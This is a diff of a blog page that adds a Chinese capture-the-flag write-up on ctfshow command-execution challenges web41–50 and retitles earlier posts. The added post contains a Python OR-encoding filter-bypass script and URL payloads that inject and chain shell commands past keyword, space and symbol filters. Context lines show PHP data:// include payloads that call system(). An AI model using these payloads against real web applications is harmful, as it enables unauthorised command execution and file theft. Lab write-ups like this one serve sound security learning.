@@ -69,9 +69,177 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-ctfshow-web入门-命令篇(二)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-ctfshow-web入门-命令篇(三)[41-]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/" class="article-date">
+    <a href="/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)%5B41-%5D/" class="article-date">
+  <time class="dt-published" datetime="2025-01-25T04:58:01.000Z" itemprop="datePublished">2025-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)%5B41-%5D/">ctfshow-web入门-命令篇(三)[41-]</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>web41</strong></p>
+<p>这题太难了完全不是我这种web新手和编程新手能写的  甚至代码都看不懂  所以先用之后在理解</p>
+<p>想了解入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127773706">CTFshow wbe41 教你写脚本_ctfshow web41-CSDN博客</a></p>
+<img src="https://www.helloimg.com/i/2025/01/25/679481d61bd1c.png" title alt style="zoom:33%;">
+
+<p>1.看见他把0-9和a-z过滤了直接懵逼  </p>
+<img src="https://www.helloimg.com/i/2025/01/25/679482db0aae2.png" title alt style="zoom:33%;">
+
+<p>2.直接看大佬写的脚本(python脚本)</p>
+<p><em><em>import re<br>import urllib<br>from urllib import parse<br>hex_i &#x3D; “”<br>hex_j &#x3D; “”<br>pattern&#x3D;’&#x2F;[0-9]|[a-z]|^|+|~|$|[|]|{|}|&amp;|-&#x2F;i’           #题目中过滤的内容<br>str1&#x3D;[“system”,”tac fla</em>“]                                       #所需编码的内容<br>for p in range(2):<br>    t1 &#x3D; “”<br>    t2 &#x3D; “”<br>    for k in str1[p]:<br>        for i in range(256):<br>            for j in range(256):<br>                if re.search(pattern,chr(i)) :<br>                    break<br>                if re.search(pattern,chr(j)) :<br>                    continue<br>                if i &lt; 16:<br>                    hex_i &#x3D; “0” + hex(i)[2:]<br>                else:<br>                    hex_i&#x3D;hex(i)[2:]<br>                if j &lt; 16:<br>                    hex_j&#x3D;”0”+hex(j)[2:]<br>                else:<br>                    hex_j&#x3D;hex(j)[2:]<br>                hex_i&#x3D;’%’+hex_i<br>                hex_j&#x3D;’%’+hex_j<br>                c&#x3D;chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))<br>                if(c &#x3D;&#x3D;k):<br>                    t1&#x3D;t1+hex_i<br>                    t2&#x3D;t2+hex_j<br>                    break<br>            else:<br>                continue<br>            break<br>    print(“(&quot;“+t1+”&quot;|&quot;“+t2+”&quot;)”)</em>*</p>
+<p>3.通过修改编码内容完成过滤  运行脚本(python  file.py)</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/679484487cbcf.png"></p>
+<p>4.然后在抓包软件输入结果然后得到flag</p>
+<img src="https://www.helloimg.com/i/2025/01/25/679484a704f88.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>先介绍知识:</p>
+<p>”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“可以用;、||、%26、%0a过滤</p>
+<p>更深原理入口:<a target="_blank" rel="noopener" href="https://blog.csdn.net/albertsh/article/details/132033812">linux环境下运行脚本时常用＞&#x2F;dev&#x2F;null 2＞&amp;1 &amp;这一串的作用_&gt;nul 2&gt;&amp;1-CSDN博客</a></p>
+<p><strong>web42</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949276ecd09.png" title alt style="zoom:33%;">
+
+<p>进入后发现没有过滤只有”&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1“</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/679493c8be5e1.png"></p>
+<p>然后利用上面的绕过得到flag</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794942d4df1b.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>web43</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949c9cb6f04.png" title alt style="zoom:33%;">
+
+<p>进入后看到多了两个过滤;和cat</p>
+<p><strong>cat</strong>可用<strong>tac</strong>代替</p>
+<p>;<strong>可用</strong>%0a等代替</p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949e58bbb95.png" title alt style="zoom:50%;">
+
+<p>如</p>
+<img src="https://www.helloimg.com/i/2025/01/25/67949d654479f.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+
+
+<p><strong>web44</strong></p>
+<p>与web43相比  多了flag过滤</p>
+<p>可以用*或?过滤</p>
+<p>**:<em>匹配0个或多个字符  如:fla</em> *    </p>
+<p>?是匹配1和字符  如:fla?.php</p>
+<p>所以直接改造 :  ?c&#x3D;tac fla?php%0a</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794a15d94fdd.png" title alt style="zoom:33%;">
+
+
+
+
+
+
+
+
+
+<p><strong>web45</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794b8b83307e.png" title alt style="zoom:33%;">
+
+<p>发现比上一题多过滤了空格</p>
+<p>空格可以用%09等代替</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794b93111f25.png"></p>
+<p>构造:?c&#x3D;tac%09fla*%0a</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794b992b3612.png"></p>
+<p><strong>web46</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794bdf3a5b73.png" title alt style="zoom:33%;">
+
+<p>这次多过滤了*和0-9</p>
+<p>但%09和%0a是url   而0-9数字不包括url编码的数字</p>
+<p>所以这次只需要和前面<strong>web45</strong>修改用?过滤</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794c5974249e.png"></p>
+<p>构造:?c&#x3D;tac%09fla?.php%0a</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794bf750b912.png"></p>
+<p><strong>web47和web48</strong></p>
+<p>和web46一样  新的过滤不影响</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794c960591ef.png" title alt style="zoom:33%;">
+
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794ca817bbb5.png"></p>
+<p><strong>web49</strong></p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cb1c67419.png"></p>
+<p>虽然过滤了%  但是不包括url编码的%</p>
+<p>所以构造相同</p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794cb64417b1.png" title alt style="zoom:33%;">
+
+
+
+
+
+<p><strong>web50</strong></p>
+<img src="https://www.helloimg.com/i/2025/01/25/6794cec29b061.png" title alt style="zoom:33%;">
+
+<p>发现过滤了%09和%26</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf2d8d0bc.png"></p>
+<p>%09用&lt;&gt;代替</p>
+<p>%26用||代替</p>
+<p>但我不知道为啥**匹配符合?**不可以用了</p>
+<p>所以把fla?.php改为fla\g.php或者fla’’g.php</p>
+<p>构造:?c&#x3D;tac&lt;&gt;fla\g.php||或者?c&#x3D;tac&lt;&gt;fla’’g.php||</p>
+<p><img src="https://www.helloimg.com/i/2025/01/25/6794cf812f0e2.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)[41-]/" data-id="cm6c4yj6o000084cxbmg7c6d5" data-title="ctfshow-web入门-命令篇(三)[41-]" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ctfshow-web入门-命令篇(二)[35-40]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)%5B35-40%5D/" class="article-date">
   <time class="dt-published" datetime="2025-01-23T05:18:52.000Z" itemprop="datePublished">2025-01-23</time>
 </a>
     
@@ -83,7 +251,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/">命令执行(web35-)</a>
+      <a class="p-name article-title" href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)%5B35-40%5D/">ctfshow-web入门-命令篇(二)[35-40]</a>
     </h1>
   
 
@@ -101,12 +269,6 @@
 <p><strong>?c&#x3D;include%09$_POST[a]?&gt;    POST:a&#x3D;data:text&#x2F;plain,<?php system('tac fla*');?></strong></p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791d80302bab.png" title alt style="zoom:50%;">
 
-
-
-
-
-
-
 <p><strong>web36</strong></p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791d991e9cf3.png" title alt style="zoom:33%;">
 
@@ -121,14 +283,6 @@
 <p>?c&#x3D;data:text&#x2F;plain,<?php system("tac fla*");?></p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791df849b2a0.png" title alt style="zoom:33%;">
 
-
-
-
-
-
-
-
-
 <p><strong>web38</strong></p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791e1dde0570.png" title alt style="zoom:33%;">
 
@@ -137,30 +291,10 @@
 <p>简写版:<strong>data:text&#x2F;plain,<?=system("命令");?></strong></p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791e2c141609.png" title alt style="zoom:33%;">
 
-
-
-
-
-
-
-
-
-
-
-
-
 <p><strong>web39</strong></p>
 <p>和前面的题一样的解法</p>
 <p><code>include($c.&quot;.php&quot;);</code>含义是在变量c的值后添加.php  对data协议无意义</p>
 <img src="https://www.helloimg.com/i/2025/01/23/6791e57bc4b9c.png" title alt style="zoom:33%;">
-
-
-
-
-
-
-
-
 
 <p><strong>web40</strong></p>
 <p><strong>localeconv()</strong>:返回包含本地数字及货币信息格式的数组。其中数组中的第一个为点号(.)</p>
@@ -187,7 +321,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/" data-id="cm690nxk900004wcxaqxu082j" data-title="命令执行(web35-)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)[35-40]/" data-id="cm6c4yj6q000184cxbu8e4fae" data-title="ctfshow-web入门-命令篇(二)[35-40]" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -199,9 +333,9 @@
 
 
   
-    <article id="post-ctfshow-web入门-命令篇(一)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-ctfshow-web入门-命令篇(一)[29-34]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/" class="article-date">
+    <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)%5B29-34%5D/" class="article-date">
   <time class="dt-published" datetime="2025-01-21T05:50:32.000Z" itemprop="datePublished">2025-01-21</time>
 </a>
     
@@ -213,7 +347,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/">命令执行</a>
+      <a class="p-name article-title" href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)%5B29-34%5D/">ctfshow-web入门-命令篇(一)[29-34]</a>
     </h1>
   
 
@@ -272,7 +406,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/" data-id="cm669z43b000120cx3pms2xyc" data-title="命令执行" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)[29-34]/" data-id="cm6c4yj6r000284cx2d1cgq8l" data-title="ctfshow-web入门-命令篇(一)[29-34]" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -284,9 +418,9 @@
 
 
   
-    <article id="post-ctfshow-web入门-爆破篇-(二)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-ctfshow-web入门-爆破篇-(二)[26-28]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)/" class="article-date">
+    <a href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)%5B26-28%5D/" class="article-date">
   <time class="dt-published" datetime="2025-01-19T08:18:48.000Z" itemprop="datePublished">2025-01-19</time>
 </a>
     
@@ -298,7 +432,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)/">ctfshow 爆破篇 (二)</a>
+      <a class="p-name article-title" href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)%5B26-28%5D/">ctfshow-web入门-爆破篇-(二)[26-28]</a>
     </h1>
   
 
@@ -342,7 +476,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)/" data-id="cm63crrac000178cxa5bc834t" data-title="ctfshow 爆破篇 (二)" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)[26-28]/" data-id="cm6c4yj6r000484cx2lcw6rk2" data-title="ctfshow-web入门-爆破篇-(二)[26-28]" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -354,9 +488,9 @@
 
 
   
-    <article id="post-ctfshow-web入门-爆破篇 (一)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-ctfshow-web入门-爆破篇 (一)[21-25]" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)/" class="article-date">
+    <a href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)%5B21-25%5D/" class="article-date">
   <time class="dt-published" datetime="2025-01-15T11:10:23.000Z" itemprop="datePublished">2025-01-15</time>
 </a>
     
@@ -368,7 +502,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)/">ctfshow wen入门 爆破篇 21-</a>
+      <a class="p-name article-title" href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)%5B21-25%5D/">ctfshow-web入门-爆破篇 (一)[21-25]</a>
     </h1>
   
 
@@ -442,7 +576,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)/" data-id="cm63crraa000078cxasgb1gg2" data-title="ctfshow wen入门 爆破篇 21-" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)[21-25]/" data-id="cm6c4yj6r000384cx9g7w0fj9" data-title="ctfshow-web入门-爆破篇 (一)[21-25]" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -621,23 +755,23 @@
       <ul>
         
           <li>
-            <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)/">命令执行(web35-)</a>
+            <a href="/2025/01/25/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%89)%5B41-%5D/">ctfshow-web入门-命令篇(三)[41-]</a>
           </li>
         
           <li>
-            <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)/">命令执行</a>
+            <a href="/2025/01/23/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%BA%8C)%5B35-40%5D/">ctfshow-web入门-命令篇(二)[35-40]</a>
           </li>
         
           <li>
-            <a href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)/">ctfshow 爆破篇 (二)</a>
+            <a href="/2025/01/21/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E7%AF%87(%E4%B8%80)%5B29-34%5D/">ctfshow-web入门-命令篇(一)[29-34]</a>
           </li>
         
           <li>
-            <a href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)/">ctfshow wen入门 爆破篇 21-</a>
+            <a href="/2025/01/19/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87-(%E4%BA%8C)%5B26-28%5D/">ctfshow-web入门-爆破篇-(二)[26-28]</a>
           </li>
         
           <li>
-            <a href="/2025/01/14/ctfshow-web%E5%85%A5%E9%97%A8-12-20/">showctf web入门12~20</a>
+            <a href="/2025/01/15/ctfshow-web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4%E7%AF%87%20(%E4%B8%80)%5B21-25%5D/">ctfshow-web入门-爆破篇 (一)[21-25]</a>
           </li>
         
       </ul>
